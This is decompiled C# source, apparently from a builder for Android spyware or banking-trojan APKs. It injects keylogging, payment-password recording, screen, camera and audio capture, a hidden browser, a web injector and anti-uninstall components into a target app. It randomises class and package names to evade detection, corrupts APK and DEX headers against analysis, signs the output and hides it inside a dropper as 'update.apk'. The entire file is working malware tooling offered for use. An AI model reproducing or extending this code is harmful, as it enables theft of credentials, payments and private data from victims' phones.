				if (Operators.CompareString(ASKPRIM_all, "1", TextCompare: false) == 0)
				{
				}
				Mylogger.Logbuild(userid, ">> Coding AndroidManifest...");
				int minCharacters = 5;
				int maxCharacters = 13;
				N_ClassGen = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				NActivityMonitors = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_ActivityCaptureScreen = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_AccessTools = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_AccessServices = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_HiddenBrowser = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_AccessibilityActivity = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_update_app_ = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_Contct_manager = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_Deviceinfo = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_My_Configs = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_ActivityDraw = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_My_Crpter = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_filesManager = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_id_Commands = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_KeyStorksQ = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_LiveChat = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_QueryChats = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_LiveKeysStrok = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_StarterServices = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_LocationMonitor = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_LockAppsActivity = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_ActivMain = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_MyLoger = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_MyNotification = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_MyPacket = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_MySettings = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_PermissionsActivity = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_RecordPayPassWord = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_RequestDraw = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_MuteUninstall = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_RequestPermissions2 = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_ScreenCaps = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_ScreenReceiver = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_StatusMonitor = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_UtliTools = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_NotifyListenService = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_WorkServices = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_HiddenActivity = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_LockActivity = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_RestrectionActivity = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_OPPOAutostart = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_BrodcastActivity = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_AnUninstall = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_TransparentActivity = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_EngineWorker = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_TransparentLauncherAlias = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_SIMLauncherAlias = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_ChromeLauncherAlias = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_OppoLauncherAlias = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_VivoLauncherAlias = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_MuteActivity = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_AlertActivity = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_HiddenIco = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_WebBrowser = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_Webjector = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_Apps_Manage = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_AudioRecorder = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N_CameraCap = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N__ChatActivity_ = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N__Codes_ = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				N__Consts_ = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				AssetsPass = Conversions.ToString(EaodWorker.Codes.RandomSTR(8, 16));
				accesstagdata_New = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				if (IsCustomeApp)
				{
					newpkg = GetRandomPackageID();
				}
				else
				{
					newpkg = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(EaodWorker.Codes.Random_Word(), "."), EaodWorker.Codes.Random_Word_2()), "."), EaodWorker.Codes.Random_Word()));
				}
				newpkg_insmali = "L" + newpkg.Replace(".", "/");
				drop_newpkg = GetRandomPackageID();
				drop_newpkg_insmali = "L" + drop_newpkg.Replace(".", "/");
				Mylogger.Logbuild(userid, "New apk PKG: " + newpkg);
				if (!IsCustomeApp)
				{
					To_Obfucate.AddRange(ResoursIds);
				}
				foreach (string item2 in To_Obfucate)
				{
					Obfucated[item2] = Conversions.ToString(EaodWorker.Codes.RandommMad(minCharacters, maxCharacters));
				}
				string[] array2 = File.ReadAllLines(TheApkPath + "\\AndroidManifest.xml");
				if (!IsCustomeApp)
				{
					while (EaodWorker.Codes.FileInUse(TheApkPath + "\\apktool.yml") | !File.Exists(TheApkPath + "\\apktool.yml"))
					{
						Thread.Sleep(1000);
					}
					File.WriteAllText(TheApkPath + $"\\res\\xml\\{accesstagdata_New}.xml", Resources.accessibilityprivatesrcapp);
					int num4 = array2.Length - 1;
					for (int j = 1; j <= num4; j++)
					{
						if (need_write && array2[j].ToLower().Contains("<uses-permission"))
						{
							array2[j] = array2[j] + "\r\n" + Resources.WritePrim;
							need_write = false;
						}
						if (need_externalstorage && array2[j].ToLower().Contains("<uses-permission"))
						{
							array2[j] = array2[j] + "\r\n" + Resources.Externalstorage;
							need_externalstorage = false;
						}
						if (need_battery && array2[j].ToLower().Contains("<uses-permission"))
						{
							array2[j] = array2[j] + "\r\n" + Resources.batteryprim;
							need_battery = false;
						}
						if (need_read && array2[j].ToLower().Contains("<uses-permission"))
						{
							array2[j] = array2[j] + "\r\n" + Resources.ReadPrim;
							need_read = false;
						}
						if (need_forground && array2[j].ToLower().Contains("<uses-permission"))
						{
							array2[j] = array2[j] + "\r\n" + Resources.FORGROUD;
							need_forground = false;
						}
						if (need_syswinow && array2[j].ToLower().Contains("<uses-permission"))
						{
							array2[j] = array2[j] + "\r\n" + Resources.SystemwindowPrim;
							need_syswinow = false;
						}
						if (need_boot && array2[j].ToLower().Contains("<uses-permission"))
						{
							array2[j] = array2[j] + "\r\n" + Resources.BootPrim;
							need_boot = false;
						}
						if (!need_all || array2[j].ToLower().Contains("<uses-permission"))
						{
						}
						if (array2[j].ToLower().Contains("<application"))
						{
							if (!array2[j].ToLower().Contains("requestLegacyExternalStorage".ToLower()))
							{
								array2[j] = array2[j].Replace("<application", "<application android:requestLegacyExternalStorage=\"true\"");
							}
							if (!array2[j].ToLower().Contains("usesCleartextTraffic".ToLower()))
							{
								array2[j] = array2[j].Replace("<application", "<application android:usesCleartextTraffic=\"true\"");
							}
							array2[j] = array2[j] + Environment.NewLine + Resources.ManifistCode.Replace("AccessibilityActivity", N_AccessibilityActivity).Replace("AccessServices", N_AccessServices).Replace("HiddenBrowser", N_HiddenBrowser)
								.Replace("AccessTools", N_AccessTools)
								.Replace("ActivityCaptureScreen", N_ActivityCaptureScreen)
								.Replace("ActivityMonitors", NActivityMonitors)
								.Replace("_update_app_", N_update_app_)
								.Replace("Consts", N__Consts_)
								.Replace("Codes", N__Codes_)
								.Replace("ChatActivity", N__ChatActivity_)
								.Replace("CameraCap", N_CameraCap)
								.Replace("Contct_manager", N_Contct_manager)
								.Replace("Deviceinfo", N_Deviceinfo)
								.Replace("My_Configs", N_My_Configs)
								.Replace("ActivityDraw", N_ActivityDraw)
								.Replace("My_Crpter", N_My_Crpter)
								.Replace("filesManager", N_filesManager)
								.Replace("id_Commands", N_id_Commands)
								.Replace("KeyStorksQ", N_KeyStorksQ)
								.Replace("LiveChat", N_LiveChat)
								.Replace("QueryChats", N_QueryChats)
								.Replace("LiveKeysStrok", N_LiveKeysStrok)
								.Replace("StarterServices", N_StarterServices)
								.Replace("LocationMonitor", N_LocationMonitor)
								.Replace("LockAppsActivity", N_LockAppsActivity)
								.Replace("ActivMain", N_ActivMain)
								.Replace("MyLoger", N_MyLoger)
								.Replace("MyNotification", N_MyNotification)
								.Replace("MyPacket", N_MyPacket)
								.Replace("MySettings", N_MySettings)
								.Replace("PermissionsActivity", N_PermissionsActivity)
								.Replace("RecordPayPassWord", N_RecordPayPassWord)
								.Replace("RequestDraw", N_RequestDraw)
								.Replace("MuteUninstall", N_MuteUninstall)
								.Replace("RequestPermissions2", N_RequestPermissions2)
								.Replace("ScreenCaps", N_ScreenCaps)
								.Replace("ScreenReceiver", N_ScreenReceiver)
								.Replace("StatusMonitor", N_StatusMonitor)
								.Replace("UtliTools", N_UtliTools)
								.Replace("NotifyListenService", N_NotifyListenService)
								.Replace("WorkServices", N_WorkServices)
								.Replace("HiddenActivity", N_HiddenActivity)
								.Replace("LockActivity", N_LockActivity)
								.Replace("RestrectionActivity", N_RestrectionActivity)
								.Replace("OPPOAutostart", N_OPPOAutostart)
								.Replace("BrodcastActivity", N_BrodcastActivity)
								.Replace("AnUninstall ", N_AnUninstall)
								.Replace("TransparentActivity", N_TransparentActivity)
								.Replace("EngineWorker", N_EngineWorker)
								.Replace("TransparentLauncherAlias", N_TransparentLauncherAlias)
								.Replace("SIMLauncherAlias", N_SIMLauncherAlias)
								.Replace("ChromeLauncherAlias", N_ChromeLauncherAlias)
								.Replace("VivoLauncherAlias", N_VivoLauncherAlias)
								.Replace("OppoLauncherAlias", N_OppoLauncherAlias)
								.Replace("MuteActivity", N_MuteActivity)
								.Replace("AlertActivity", N_AlertActivity)
								.Replace("HiddenIco", N_HiddenIco)
								.Replace("WebBrowser", N_WebBrowser)
								.Replace("Webjector", N_Webjector)
								.Replace(oldpkg, newpkg)
								.Replace(oldpkg_insmali, newpkg_insmali)
								.Replace("ClassGen", N_ClassGen)
								.Replace("AudioRecorder", N_AudioRecorder)
								.Replace(accesstagdata, accesstagdata_New)
								.Replace("Apps_Manage", N_Apps_Manage);
							break;
						}
					}
				}
				if (IsCustomeApp)
				{
					Mylogger.Logbuild(userid, ">> Updating Res files...");
					string text13 = TheApkPath + "\\res\\values\\public.xml";
					do
					{
						Thread.Sleep(100);
					}
					while (!File.Exists(text13) | EaodWorker.Codes.FileInUse(text13));
					string contents2 = File.ReadAllText(text13).Replace(accesstagdata, accesstagdata_New);
					File.WriteAllText(text13, contents2);
					string text14 = TheApkPath + $"\\res\\xml\\{accesstagdata}.xml";
					do
					{
						Thread.Sleep(100);
					}
					while (!File.Exists(text14) | EaodWorker.Codes.FileInUse(text14));
					string destFileName = TheApkPath + $"\\res\\xml\\{accesstagdata_New}.xml";
					File.Move(text14, destFileName);
					string xmlContent = File.ReadAllText(TheApkPath + "\\AndroidManifest.xml").Replace("AccessibilityActivity", N_AccessibilityActivity).Replace("AccessServices", N_AccessServices)
						.Replace("HiddenBrowser", N_HiddenBrowser)
						.Replace("AccessTools", N_AccessTools)
						.Replace("ActivityCaptureScreen", N_ActivityCaptureScreen)
						.Replace("ActivityMonitors", NActivityMonitors)
						.Replace("_update_app_", N_update_app_)
						.Replace("Consts", N__Consts_)
						.Replace("Codes", N__Codes_)
						.Replace("ChatActivity", N__ChatActivity_)
						.Replace("CameraCap", N_CameraCap)
						.Replace("Contct_manager", N_Contct_manager)
						.Replace("Deviceinfo", N_Deviceinfo)
						.Replace("My_Configs", N_My_Configs)
						.Replace("ActivityDraw", N_ActivityDraw)
						.Replace("My_Crpter", N_My_Crpter)
						.Replace("filesManager", N_filesManager)
						.Replace("id_Commands", N_id_Commands)
						.Replace("KeyStorksQ", N_KeyStorksQ)
						.Replace("LiveChat", N_LiveChat)
						.Replace("QueryChats", N_QueryChats)
						.Replace("LiveKeysStrok", N_LiveKeysStrok)
						.Replace("StarterServices", N_StarterServices)
						.Replace("LocationMonitor", N_LocationMonitor)
						.Replace("LockAppsActivity", N_LockAppsActivity)
						.Replace("ActivMain", N_ActivMain)
						.Replace("MyLoger", N_MyLoger)
						.Replace("MyNotification", N_MyNotification)
						.Replace("MyPacket", N_MyPacket)
						.Replace("MySettings", N_MySettings)
						.Replace("PermissionsActivity", N_PermissionsActivity)
						.Replace("RecordPayPassWord", N_RecordPayPassWord)
						.Replace("RequestDraw", N_RequestDraw)
						.Replace("MuteUninstall", N_MuteUninstall)
						.Replace("RequestPermissions2", N_RequestPermissions2)
						.Replace("ScreenCaps", N_ScreenCaps)
						.Replace("ScreenReceiver", N_ScreenReceiver)
						.Replace("StatusMonitor", N_StatusMonitor)
						.Replace("UtliTools", N_UtliTools)
						.Replace("NotifyListenService", N_NotifyListenService)
						.Replace("WorkServices", N_WorkServices)
						.Replace("HiddenActivity", N_HiddenActivity)
						.Replace("LockActivity", N_LockActivity)
						.Replace("RestrectionActivity", N_RestrectionActivity)
						.Replace("OPPOAutostart", N_OPPOAutostart)
						.Replace("BrodcastActivity", N_BrodcastActivity)
						.Replace("AnUninstall ", N_AnUninstall)
						.Replace("TransparentActivity", N_TransparentActivity)
						.Replace("EngineWorker", N_EngineWorker)
						.Replace("TransparentLauncherAlias", N_TransparentLauncherAlias)
						.Replace("SIMLauncherAlias", N_SIMLauncherAlias)
						.Replace("ChromeLauncherAlias", N_ChromeLauncherAlias)
						.Replace("VivoLauncherAlias", N_VivoLauncherAlias)
						.Replace("OppoLauncherAlias", N_OppoLauncherAlias)
						.Replace("MuteActivity", N_MuteActivity)
						.Replace("AlertActivity", N_AlertActivity)
						.Replace("HiddenIco", N_HiddenIco)
						.Replace("WebBrowser", N_WebBrowser)
						.Replace("Webjector", N_Webjector)
						.Replace(oldpkg, newpkg)
						.Replace(oldpkg_insmali, newpkg_insmali)
						.Replace("ClassGen", N_ClassGen)
						.Replace("AudioRecorder", N_AudioRecorder)
						.Replace(accesstagdata, accesstagdata_New)
						.Replace("Apps_Manage", N_Apps_Manage);
					File.WriteAllText(TheApkPath + "\\AndroidManifest.xml", ConfuseAndObfuscateManifestXml(xmlContent));
				}
				else
				{
					File.WriteAllLines(TheApkPath + "\\AndroidManifest.xml", array2);
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				Mylogger.LogError(userid, "Step2", ex2.Message);
				ProjectData.ClearProjectError();
			}
		}
	}

	public static void SignMe(string name, string value)
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\EaodWorkers");
			registryKey.SetValue(name, value);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	public static void singout(string name)
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\EaodWorkers", writable: true);
			if (registryKey != null)
			{
				registryKey.DeleteValue(name, throwOnMissingValue: false);
				Mylogger.Logbuild(userid, $"Key '{name}' removed successfully.");
			}
			else
			{
				Mylogger.Logbuild(userid, "Registry subkey not found.");
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Mylogger.LogError(userid, "singout error occurred: ", ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	public static void Step1()
	{
		Mylogger.Logbuild(userid, ">> Step1 Started..");
		Mylogger.Logbuild(userid, ">> Preparation Started..");
		HoldMainThread = true;
		string text = "";
		try
		{
			text = ((!IsCustomeApp) ? EaodWorker.Codes.GenerateRandomFolderName("jector") : EaodWorker.Codes.GenerateRandomFolderName("custom"));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Mylogger.Logbuild(userid, "Error Create Work Folder:" + ex2.Message);
			Environment.Exit(0);
			ProjectData.ClearProjectError();
		}
		WorkingDir = text;
		TheApkPath = WorkingDir + "\\temp";
		if (!Directory.Exists(TheApkPath))
		{
			Directory.CreateDirectory(TheApkPath);
		}
		cmdProcess = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.RedirectStandardInput = true;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		cmdProcess.EnableRaisingEvents = true;
		cmdProcess.StartInfo = processStartInfo;
		cmdProcess.OutputDataReceived += cmdOutputHandler;
		cmdProcess.ErrorDataReceived += cmdOutputHandler;
		cmdProcess.Start();
		cmdProcess.BeginOutputReadLine();
		cmdProcess.BeginErrorReadLine();
		apktemp = text + "\\temp.apk";
		apktoolpath = text + "\\apktool.jar";
		Apksignerpath = text + "\\signapk.jar";
		ApkZIPpath = text + "\\zipalign.exe";
		Apkeditorpath = text + "\\ApkEditor.jar";
		extractorzip = text + "\\7.exe";
		ExecuteCommand("java -version");
		do
		{
			Thread.Sleep(1);
		}
		while (HoldMainThread);
	}

	private static void ExecuteCommand(string command)
	{
		cmdProcess.StandardInput.WriteLine(command);
		cmdProcess.StandardInput.Flush();
	}

	private static void cmdOutputHandler(object sender, DataReceivedEventArgs e)
	{
		if (string.IsNullOrEmpty(e.Data))
		{
			return;
		}
		checked
		{
			try
			{
				string data = e.Data;
				if (data.Contains("java is not recognized"))
				{
					Mylogger.Logbuild(userid, ">> Java not installed : go to google and install (java jdk)");
					singout(MYID);
					Environment.Exit(0);
				}
				if (data.StartsWith("I:"))
				{
					Mylogger.Logbuild(userid, ">" + data.Replace("I:", "> "));
				}
				else if (data.Contains("[PROTECT]") && !data.Contains("Writing:"))
				{
					Mylogger.Logbuild(userid, ">" + data);
				}
				else if (data.StartsWith("W:"))
				{
					Mylogger.Logbuild(userid, ">> Extract Finish..");
				}
				else if (data.StartsWith("E:"))
				{
					Mylogger.Logbuild(userid, ">" + data.Replace("E:", "ERROR :"));
				}
				if (data.Contains("[PROTECT] Saved to"))
				{
					Waitprotect = false;
				}
				if (data.Contains("Java(TM)") | data.Contains("OpenJDK"))
				{
					if (!Once)
					{
						Once = true;
						Mylogger.Logbuild(userid, ">> Extract New Data..");
						originalapkname = appid;
						File.Copy(ZIPPATH, WorkingDir + "\\temp.zip");
						string sourceFileName = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "tools", "apktool.jar");
						File.Copy(sourceFileName, apktoolpath, overwrite: true);
						File.WriteAllBytes(Apksignerpath, Resources.signapk);
						File.WriteAllBytes(ApkZIPpath, Resources.zipalign);
						string sourceFileName2 = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "tools", "APKEditor.jar");
						File.Copy(sourceFileName2, Apkeditorpath, overwrite: true);
						File.WriteAllBytes(extractorzip, Resources._7zip);
						Mylogger.Logbuild(userid, ">> Extract Apk Start..");
						ExecuteCommand("cd " + WorkingDir);
						ExecuteCommand("7.exe x \"" + WorkingDir + "\\temp.zip\" -otemp");
					}
				}
				else if (data.Contains("Everything is Ok"))
				{
					Mylogger.Logbuild(userid, ">> Extract Finish..");
					HoldMainThread = false;
				}
				else
				{
					if (!data.Contains("Built apk"))
					{
						return;
					}
					if (fordroper)
					{
						Waitbuild = false;
						return;
					}
					while (!File.Exists(outputapk))
					{
						Thread.Sleep(1000);
					}
					string text = outputapk.Replace(".apk", "_protected.apk");
					if (!IsCustomeApp | (Operators.CompareString(notifymsg, "off", TextCompare: false) == 0))
					{
						Mylogger.Logbuild(userid, ">Skip Protect..");
						File.Move(outputapk, text);
					}
					else
					{
						Mylogger.Logbuild(userid, "> Protect Apk..");
						Waitprotect = true;
						string command = "java -jar -Xms4096M -Xmx6144M " + Apkeditorpath + " p  -i \"" + outputapk + "\"";
						ExecuteCommand(command);
						while (!File.Exists(text) | Waitprotect)
						{
							Thread.Sleep(1000);
						}
						File.Delete(outputapk);
						Mylogger.Logbuild(userid, "> Protect Apk v2..");
						DexEditor dexEditor = new DexEditor();
						dexEditor.LoadFile(text);
						DexHeaderInfo dexHeaderInfo = dexEditor.ReadHeader();
						dexEditor.SetHeaderSize(9999);
						dexEditor.SetFileSize(0);
						dexEditor.SetMagic(DexEditor.DexMagicType.ZIP);
						string text2 = outputapk.Replace(".apk", "_Crafted.apk");
						dexEditor.SaveFile(text2);
						APKProtector aPKProtector = new APKProtector(zeroSizes: false, corruptCRC: true, corruptOffsets: false, addFakeExtra: true, addPadding: false, addFakeEntries: true, randomCompressionMethod: true);
						File.Delete(text);
						aPKProtector.ProtectAPK(text2, text);
					}
					Mylogger.Logbuild(userid, ">> Zip Align..");
					string command2 = ApkZIPpath + " 4 \"" + text + "\" \"" + text.Replace("Ready_protected.apk", "Ready_zip.apk") + "\"";
					string text3 = text.Replace("Ready_protected.apk", "Ready_zip.apk");
					ExecuteCommand(command2);
					while (!File.Exists(text3) | EaodWorker.Codes.FileInUse(text3))
					{
						Thread.Sleep(5000);
					}
					File.Delete(text);
					Mylogger.Logbuild(userid, ">> Sign APK..");
					File.WriteAllBytes(WorkingDir + "\\certificate.pem", Resources.certificate);
					File.WriteAllBytes(WorkingDir + "\\key.pk8", Resources.key);
					string text4 = WorkingDir + "\\out\\" + originalapkname.Replace(".apk", "_Jected.apk");
					string command3 = "java -jar \"" + Apksignerpath + "\" sign --key " + WorkingDir + "\\key.pk8 --cert " + WorkingDir + "\\certificate.pem  --v2-signing-enabled true --v3-signing-enabled false --out \"" + WorkingDir + "\\out\\" + originalapkname.Replace(".apk", "_Jected.apk") + "\" \"" + text3 + "\"";
					ExecuteCommand(command3);
					while (!File.Exists(text4) | EaodWorker.Codes.FileInUse(text4))
					{
						Thread.Sleep(5000);
					}
					File.Delete(text3);
					Mylogger.Logbuild(userid, ">-----------Finished-------------\r\n> App: " + originalapkname + "\r\n");
					if (File.Exists(userfolder + "\\" + appid + ".apk"))
					{
						File.Delete(userfolder + "\\" + appid + ".apk");
					}
					int num = 1;
					do
					{
						Thread.Sleep(1000);
						num++;
					}
					while (num <= 5);
					if ((Operators.CompareString(use_access, "1", TextCompare: false) != 0) | (Operators.CompareString(installtype, "g", TextCompare: false) == 0))
					{
						Mylogger.Logbuild(userid, "No Drooper needed...");
						Mylogger.Logbuild(userid, "signoutput: " + text4);
						if (!Directory.Exists(userfolder))
						{
							Directory.CreateDirectory(userfolder);
						}
						Mylogger.Logbuild(userid, "userfolder: " + userfolder + "\\" + appid);
						File.Move(text4, userfolder + "\\" + appid + ".apk");
						int num2 = 1;
						do
						{
							Thread.Sleep(100);
							num2++;
						}
						while (num2 <= 30);
						UpdateState(finished);
						Mylogger.Logbuild(userid, "Cleanning...");
						try
						{
							Mylogger.Logbuild(userid, "Cleanning WorkingDir...");
							EaodWorker.Codes.DirectoryDeleteLong(WorkingDir);
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex);
							Exception ex2 = ex;
							Mylogger.Logbuild(userid, "error WorkingDir: " + ex2.Message);
							ProjectData.ClearProjectError();
						}
						HoldFinishing = false;
						StopCommandPrompt();
					}
					else
					{
						TargetAPKPATH = text4;
						BackgroundWorker1 = new BackgroundWorker();
						if (!BackgroundWorker1.IsBusy)
						{
							BackgroundWorker1.RunWorkerAsync();
						}
					}
				}
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception ex4 = ex3;
				Mylogger.LogError(userid, ">Global Error: ", ex4.Message);
				singout(MYID);
				try
				{
					Mylogger.Logbuild(userid, "Cleanning WorkingDir...");
					EaodWorker.Codes.DirectoryDeleteLong(WorkingDir);
				}
				catch (Exception ex5)
				{
					ProjectData.SetProjectError(ex5);
					Exception ex6 = ex5;
					Mylogger.LogError(userid, "error WorkingDir 2: ", ex4.Message);
					ProjectData.ClearProjectError();
				}
				Environment.Exit(0);
				ProjectData.ClearProjectError();
			}
		}
	}

	private static void BackgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
	{
		checked
		{
			try
			{
				Mylogger.Logbuild(userid, "Extracting...");
				string workDIR = default(string);
				try
				{
					workDIR = EaodWorker.Codes.GenerateRandomFolderName("drooper");
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					Mylogger.Logbuild(userid, "Error Droper Work Folder:" + ex2.Message);
					Environment.Exit(0);
					ProjectData.ClearProjectError();
				}
				WorkDIR = workDIR;
				STUBPATH = WorkDIR + "\\STUB";
				outputpath = WorkDIR + "\\out";
				buildapkpath = outputpath + "\\temp.apk";
				Directory.CreateDirectory(WorkDIR);
				Directory.CreateDirectory(WorkDIR + "\\tools");
				Directory.CreateDirectory(STUBPATH);
				Directory.CreateDirectory(outputpath);
				apktoolpath = WorkDIR + "\\tools\\apktool.jar";
				Apksignerpath = WorkDIR + "\\tools\\signapk.jar";
				ApkZIPpath = WorkDIR + "\\tools\\zipalign.exe";
				Apkeditorpath = WorkDIR + "\\tools\\ApkEditor.jar";
				C = WorkDIR + "\\tools\\certificate.pem";
				K = WorkDIR + "\\tools\\key.pk8";
				File.WriteAllBytes(Apksignerpath, Resources.signapk);
				File.WriteAllBytes(ApkZIPpath, Resources.zipalign);
				string sourceFileName = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "tools", "apktool.jar");
				File.Copy(sourceFileName, apktoolpath, overwrite: true);
				string sourceFileName2 = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "tools", "APKEditor.jar");
				File.Copy(sourceFileName2, Apkeditorpath, overwrite: true);
				File.WriteAllBytes(Apksignerpath, Resources.signapk);
				File.WriteAllBytes(ApkZIPpath, Resources.zipalign);
				File.Copy(DropStub, STUBPATH + "\\drop.zip");
				Thread.Sleep(1000);
				System.IO.Compression.ZipFile.ExtractToDirectory(STUBPATH + "\\drop.zip", STUBPATH);
				Thread.Sleep(1000);
				File.Delete(STUBPATH + "\\drop.zip");
				Mylogger.Logbuild(userid, ">loading payload...");
				assetspath = STUBPATH + "\\assets";
				BASEPATH = assetspath + "\\update.apk";
				if (File.Exists(BASEPATH))
				{
					File.Delete(BASEPATH);
				}
				File.Copy(TargetAPKPATH, BASEPATH);
				Mylogger.Logbuild(userid, "bmb assets droper..");
				InjectRandomJunkFiles(assetspath);
				InjectRandomJunkFiles(assetspath);
				stringspath = STUBPATH + "\\res\\values\\strings.xml";
				MainfistPath = STUBPATH + "\\AndroidManifest.xml";
				stubicon = STUBPATH + "\\res\\drawable\\myicon.png";
				string text = STUBPATH + "\\apktool.yml";
				do
				{
					Thread.Sleep(100);
				}
				while (!File.Exists(text) | EaodWorker.Codes.FileInUse(text));
				string contents = File.ReadAllText(text).Replace("3.31.165", Conversions.ToString(Operators.AddObject(appversion + " ", EaodWorker.Codes.Random_Word()))).Replace("331165", appversion.Replace(".", ""));
				File.WriteAllText(text, contents);
				Mylogger.Logbuild(userid, "loading data...");
				string contents2 = File.ReadAllText(stringspath).Replace("[MY-NAME]", logintitle);
				File.WriteAllText(stringspath, contents2);
				string[] array = File.ReadAllLines(stringspath);
				string text2 = "";
				int num = 1;
				do
				{
